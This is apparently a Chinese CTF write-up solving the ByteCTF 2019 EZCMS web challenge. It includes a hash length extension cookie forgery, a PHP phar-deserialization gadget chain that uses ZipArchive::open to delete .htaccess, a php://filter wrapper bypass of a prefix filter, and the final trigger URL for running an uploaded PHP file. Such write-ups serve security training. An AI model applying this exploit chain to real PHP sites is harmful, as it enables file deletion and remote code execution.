### EZCMS
地址：[buuctf/EZCMS](https://buuoj.cn/challenges#[ByteCTF%202019]EZCMS)
扫目录有www.zip源码泄露，打开之后大概看一下。
```php
function is_admin(){
    $secret = "********";
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    if ($username == "admin" && $password != "admin"){
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
```
标准的哈希扩展攻击，hashpump跑一下，用admin/123456登录，改cookie，获得上传权限。
{% asset_img hashexpand.png %}
试了试上传好像没过滤，传个php成功了，啥套路。不过马上发现传上去的文件都不能直接访问，会500，只能通过view.php查看。默认目录下有个.htaccess文件，这个500其实就是它造成的。
再看看源码，给了源码又没啥注入点，估计是反序列化的套路，找找看发现有个File对象，属性都是public，很像。
观察这个类，发现可控的文件路径传进了mime_content_type中，前两天suctf的wrietup中提到这个函数也可以触发phar反序列化，所以这里形成了漏洞：
```php
    public function view_detail(){

        if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;

    }
```
再找找能利用的魔法方法，发现Profile类里面有个__call:
```php
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
```
这里有个open方法，套路就是找其他有open方法的自带类，跑一下：
```php
<?php
  foreach (get_declared_classes() as $class) {
    foreach (get_class_methods($class) as $method) {
      if ($method == "open")
        echo "$class->$method\n";
    }
  }
?>
```
有四个分别是SessionHandler、ZipArchive、XMLReader、SQLite3。其中ZipArchive->open()方法的ZipArchive::OVERWRITE选项可以用来删除文件，正好可以用来解决.htaccess，就可以正常访问上传的php文件了。触发的点是File类中的析构函数调用了checker的upload_file方法，而ZipArchive类中没有这个方法，触发了__call函数，调用了open方法，实现删除文件。
```php
<?php
class File{

    public $filename;
    public $filepath;
    public $checker;

    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }
}
class Profile{

    public $username;
    public $password;
    public $admin;
}
$a = new File();
$a->checker = new Profile();
$a->checker->username = "/var/www/html/sandbox/84aa202da71a9c0f4214025ba4583481/.htaccess";
$a->checker->password = ZipArchive::OVERWRITE | ZipArchive::CREATE;
$a->checker->admin = new ZipArchive();
$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
?>
```
然后是调用phar的方法，这里限制了路径开头不能有phar，还是suctf的writeup提到可以用伪协议绕过。这样payload就是
112.126.102.158:9999/view.php?filename=2fa0baf1c751e2e9645ea67da0792644.phar&filepath=php://filter/read=convert.base64-encode/resource=phar://./sandbox/84aa202da71a9c0f4214025ba4583481/2fa0baf1c751e2e9645ea67da0792644.phar
触发后直接访问上传的php文件就行了，不要再访问upload.php否则会又生成.htaccess

其实后半部分基本是这道题https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault

#参考链接
https://altman.vip/2019/09/09/ByteCTF-WEB/
https://blog.zeddyu.info/2019/08/24/SUCTF-2019/
https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/
https://www.fuzzer.xyz/2019/04/29/